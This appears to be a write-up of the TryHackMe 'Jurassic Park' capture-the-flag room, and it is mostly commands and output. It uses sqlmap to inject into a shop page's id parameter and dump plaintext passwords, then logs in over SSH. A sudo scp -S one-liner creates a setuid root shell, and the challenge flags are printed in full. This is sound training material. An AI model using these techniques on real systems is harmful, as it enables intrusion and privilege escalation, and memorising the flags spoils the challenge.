| Category          | Details                                                  |
|-------------------|----------------------------------------------------------|
| 📝 **Name**       | [Jurassic Park](https://tryhackme.com/room/jurassicpark) |  
| 🏷 **Type**       | THM Challenge                                            |
| 🖥 **OS**         | Linux                                                    |
| 🎯 **Difficulty** | Hard                                                     |
| 📁 **Tags**       | SQLi, sudo scp                                           |

## Task 1: Jurassic Park CTF

### What is the name of the SQL database serving the shop information?

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Jurassic Park]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 14:15 +0100
Nmap scan report for 10.81.165.234
Host is up (0.053s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:72:2b:23:bf:29:86:58:a4:09:ad:e9:b3:10:74:73 (RSA)
|   256 6f:22:32:42:f6:90:f7:94:70:76:cb:54:5f:35:04:18 (ECDSA)
|_  256 16:e4:e8:01:56:e8:f1:a9:93:cc:57:9a:2f:f9:02:da (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Jarassic Park
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.10 seconds
```

#### Save HTTP GET `/item.php?id=1` captured with Burp
```
┌──(magicrc㉿perun)-[~/attack/THM Jurassic Park]
└─$ cat <<'EOF'> item.http
GET /item.php?id=1 HTTP/1.1
Host: 10.81.165.234
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

EOF
```

#### Use `item.http` for enumeration with `sqlmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Jurassic Park]
└─$ sqlmap -r item.http --level 5 --batch
<SNIP>
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 441 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8889=8889

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=1 AND GTID_SUBSET(CONCAT(0x71786b7071,(SELECT (ELT(5774=5774,1))),0x7171767671),5774)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 6152 FROM (SELECT(SLEEP(5)))obrg)
---
<SNIP>
```

#### List all databases
```
┌──(magicrc㉿perun)-[~/attack/THM Jurassic Park]
└─$ sqlmap -r item.http --dbs            
<SNIP>
[15:05:52] [INFO] fetching database names
[15:05:52] [INFO] retrieved: 'information_schema'
[15:05:52] [INFO] retrieved: 'mysql'
[15:05:52] [INFO] retrieved: 'park'
[15:05:52] [INFO] retrieved: 'performance_schema'
[15:05:52] [INFO] retrieved: 'sys'
<SNIP>
```
`park` seems to be database serving the shop information.

### How many columns does the table have?
Question does not specify which table, thus we will check all of them.

#### Lista tables in `park` database
```
┌──(magicrc㉿perun)-[~/attack/THM Jurassic Park]
└─$ sqlmap -r item.http -D park --tables
<SNIP>
[15:07:32] [INFO] fetching tables for database: 'park'
[15:07:32] [INFO] retrieved: 'items'
[15:07:32] [INFO] retrieved: 'users'
Database: park
[2 tables]
+-------+
| items |
| users |
+-------+
<SNIP>
```

#### Dump `users` table
```
┌──(magicrc㉿perun)-[~/attack/THM Jurassic Park]
└─$ sqlmap -r item.http -D park -T users --dump
<SNIP>
Database: park
Table: users
[2 entries]
+----+-----------+----------+
| id | password  | username |
+----+-----------+----------+
| 1  | D0nt3ATM3 |          |
| 2  | ih8dinos  |          |
+----+-----------+----------+
<SNIP>
```
Table `users` has 3 columns, and passwords in plaintext. 

#### Dump `items` table
```
┌──(magicrc㉿perun)-[~/attack/THM Jurassic Park]
└─$ sqlmap -r item.http -D park -T items --dump
<SNIP>
Database: park
Table: items
[5 entries]
+-----+------+--------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id  | sold | price  | package     | information                                                                                                                                                                            |
+-----+------+--------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1   | 4    | 500000 | Gold        | Childen under 5 can attend free of charge and will be eaten for free. This package includes a dinosaur lunch, tour around the park AND a FREE dinosaur egg from a dino of your choice! |
| 2   | 11   | 250000 | Bronse      | Children under 5 can attend free of charge and eat free. This package includes a tour around the park and a dinosaur lunch! Try different dino's and rate the best tasting one!        |
| 3   | 27   | 100000 | Basic       | Children under 5 can attend for free and eat free. This package will include a basic tour around the park in the brand new automated cars!                                             |
| 5   | 0    | 0      | Development | Dennis, why have you blocked these characters: ' # DROP - username @ ---- Is this our WAF now?                                                                                         |
| 100 | -1   | -1     | ...         | Nope                                                                                                                                                                                   |
+-----+------+--------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
<SNIP>
```
Table `items` has 5 columns, (and this is correct answer). We can see also that `Dennis` is mentioned in one of the entries.

### What is the system version?

#### Use `dennis:ih8dinos` credentials to access target over SSH
```
┌──(magicrc㉿perun)-[~/attack/THM Jurassic Park]
└─$ ssh dennis@$TARGET 
<SNIP>
dennis@ip-10-81-165-234:~$ id
uid=1001(dennis) gid=1001(dennis) groups=1001(dennis)
```

#### Check the system version
```
dennis@ip-10-81-165-234:~$ cat /etc/os-release 
NAME="Ubuntu"
VERSION="16.04.5 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.5 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```
Target is running on `Ubuntu 16.04`.

### What is Dennis' password?
We were able to access target over SSH using `dennis:ih8dinos` credentials.

### What are the contents of the first flag?

#### Captrue 1st flag
```
dennis@ip-10-81-165-234:~$ cat /home/dennis/flag1.txt 
Congrats on finding the first flag.. But what about the rest? :O

b89f2d69c56b9981ac92dd267f
```

### What are the contents of the second flag?

#### Look for flag files
```
dennis@ip-10-81-165-234:~$ find / -type f -name 'flag*.txt' 2> /dev/null
/home/dennis/flag1.txt
/boot/grub/fonts/flagTwo.txt
```

#### Capture 2nd flag
```
dennis@ip-10-81-165-234:~$ cat /boot/grub/fonts/flagTwo.txt
96ccd6b429be8c9a4b501c7a0b117b0a
```

### What are the contents of the third flag?

#### Capture 3rd flag
```
dennis@ip-10-81-165-234:~$ grep Flag3 .bash_history 
Flag3:b4973bbc9053807856ec815db25fb3f1
```

### What are the contents of the fifth flag?

#### List allowed sudo commands
```
dennis@ip-10-81-165-234:~$ sudo -l
Matching Defaults entries for dennis on ip-10-81-165-234.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dennis may run the following commands on ip-10-81-165-234.eu-west-1.compute.internal:
    (ALL) NOPASSWD: /usr/bin/scp
```

#### Abuse `sudo /usr/bin/scp` to spawn root shell
```
dennis@ip-10-81-165-234:~$ \
echo '/bin/cp /bin/bash /tmp/root_shell && /bin/chown root /tmp/root_shell && /bin/chmod +s /tmp/root_shell' > /home/dennis/root.sh && \
chmod +x /home/dennis/root.sh && \
sudo /usr/bin/scp -S /home/dennis/root.sh . x: ; \
/tmp/root_shell -p
lost connection
root_shell-4.3# id
uid=1001(dennis) gid=1001(dennis) euid=0(root) egid=0(root) groups=0(root),1001(dennis)
```

#### Capture 5th flag
```
root_shell-4.3# find / -type f -name 'flag*.txt' 2> /dev/null
/root/flag5.txt
/home/dennis/flag1.txt
/boot/grub/fonts/flagTwo.txt
root_shell-4.3# cat /root/flag5.txt 
2a7074e491fcacc7eeba97808dc5e2ec
```
